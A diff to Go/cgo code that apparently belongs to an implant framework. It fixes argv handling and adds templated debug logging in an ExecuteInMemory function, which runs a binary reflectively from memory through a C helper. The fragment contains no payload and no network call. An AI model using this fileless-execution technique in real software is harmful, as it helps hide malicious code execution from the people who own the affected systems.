@@ -48,8 +48,15 @@ static inline int call_reflect_exec(unsigned char *data, char **argv) {
 	return pid;
 }
 */
-
 import "C"
+import (
+	"bytes"
+	// {{if .Config.Debug}}
+	"log"
+	// {{end}}
+	"sync"
+	"unsafe"
+)
 
 type cgoOutput struct {
 	Out *bytes.Buffer
@@ -62,17 +69,20 @@ var outbuff cgoOutput
 // Returns a string containing the merged stdout + stderrr,
 // the PID of the forked process, and any error that might have occured.
 func ExecuteInMemory(data []byte, args []string) (string, int, error) {
+	// {{if .Config.Debug}}
+	log.Printf("Executing %s\n", args)
+	// {{end}}
 	argv := make([]*C.char, len(args)+1)
-	for i, a := range args[1:] {
+	for i, a := range args {
 		argv[i] = C.CString(a)
 	}
-	argv[len(args)] = nil
+	// argv needs to terminate with a NULL pointer, otherwise we might have uninitialized memory
+	argv[len(argv)-1] = nil
 	defer func() {
 		for _, arg := range argv {
 			C.free(unsafe.Pointer(arg))
 		}
 	}()
-	var output string
 	outbuff.Lock()
 	pid, err := C.call_reflect_exec((*C.uchar)(&data[0]), &argv[0])
 	if err != nil {
